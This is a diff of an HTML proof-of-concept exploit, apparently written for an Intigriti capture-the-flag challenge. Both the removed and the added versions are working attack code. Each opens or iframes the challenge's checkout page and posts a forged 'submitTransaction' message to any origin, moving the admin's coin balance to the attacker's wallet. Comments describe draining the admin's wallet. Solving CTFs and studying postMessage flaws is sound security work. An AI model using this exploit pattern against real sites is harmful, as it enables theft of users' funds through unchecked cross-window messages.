@@ -1,33 +1,37 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <title>PostMessage Exploit PoC</title>
+</head>
 <body>
-<script>
-// CONFIGURE THESE VALUES
-const TARGET = 'https://challenge-0126.intigriti.io';
-const YOUR_USERNAME = '1f4eb50b5dd8445bd28502edceac448763'; // <--- CHANGE TO YOUR USERNAME
-const AMOUNT_TO_STEAL = 100; // Admin's full 1337COIN balance
-
-// Open checkout page
-const win = window.open(TARGET + '/checkout.html?currency=BTC&price=1', '_blank');
-
-setTimeout(() => {
-    // Craft transaction to steal admin's 1337COIN to your account
-    win.postMessage({
-        type: 'submitTransaction',
-        transaction: {
-            currency: '1337COIN',  // Target the rare currency
-            amount: AMOUNT_TO_STEAL,  // Drain their wallet
-            toAddress: YOUR_USERNAME  // Send to YOUR account
-        }
-    }, '*');
+    <h1>"Following the trail of coins..."</h1>
     
-    setTimeout(() => {
-        win.close();
-        // Redirect to dashboard to see your new balance
-        window.location = TARGET + '/dashboard.html';
-    }, 2000);
-}, 2000);
-</script>
-<p>Processing transaction...</p>
+    <iframe id="target" src="https://YOUR_CHALLENGE_URL/checkout.html?currency=BTC&price=1" width="500" height="500"></iframe>
+
+    <script>
+        // Step 2: Wait for the iframe to load
+        document.getElementById('target').onload = function() {
+            console.log("Iframe loaded, preparing payload...");
+            
+            var targetFrame = document.getElementById('target').contentWindow;
+
+            // Step 3: Craft the malicious transaction data
+            var maliciousPayload = {
+                type: 'submitTransaction',
+                transaction: {
+                    currency: 'BTC', // You can change to ETH or XMR
+                    amount: 1337,    // A high amount to drain the admin
+                    toAddress: '11854a13cc79b72d8e6485a8f0801e607d' // Put your CTF user's wallet address here
+                }
+            };
+
+            // Step 4: Send the message! The '*' means we send it to any origin.
+            // We use a slight delay to ensure target JS is fully initialized.
+            setTimeout(() => {
+                targetFrame.postMessage(maliciousPayload, '*');
+                console.log("Payload sent!");
+            }, 1000); 
+        };
+    </script>
 </body>
 </html>
